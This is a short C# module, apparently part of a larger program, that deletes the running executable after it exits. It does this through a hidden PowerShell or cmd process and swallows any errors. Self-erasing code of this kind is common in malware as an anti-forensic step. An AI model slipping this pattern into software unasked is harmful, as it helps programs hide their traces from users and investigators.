using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace MB1.Modules
{
    public static class CleanUp
    {
        public static void PowerShell()
        {
            StartProcess("powershell.exe", "start-sleep 5; remove-item");
        }
        public static void CommandPrompt()
        {
            StartProcess("cmd.exe", "timeout 5 > nul & del");         
        }

        private static string GetProgramPath()
        {
            return Path.GetFullPath(Assembly.GetExecutingAssembly().Location);
        }

        private static void StartProcess(string processName, string args)
        {
            try
            {
                string path = GetProgramPath();
                Process process = new Process();
                process.StartInfo = new ProcessStartInfo();
                process.StartInfo.FileName = processName;
                process.StartInfo.Arguments = $"{args} {path}"; 
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardError = false;
                process.StartInfo.RedirectStandardOutput = false;
                process.Start();

                //StreamReader streamReader = process.StandardError;
                //Console.WriteLine($"Error: {streamReader}");
                //streamReader = process.StandardOutput;
                //Console.WriteLine($"Error: {streamReader}");
            }
            catch { }
        }
    }
}
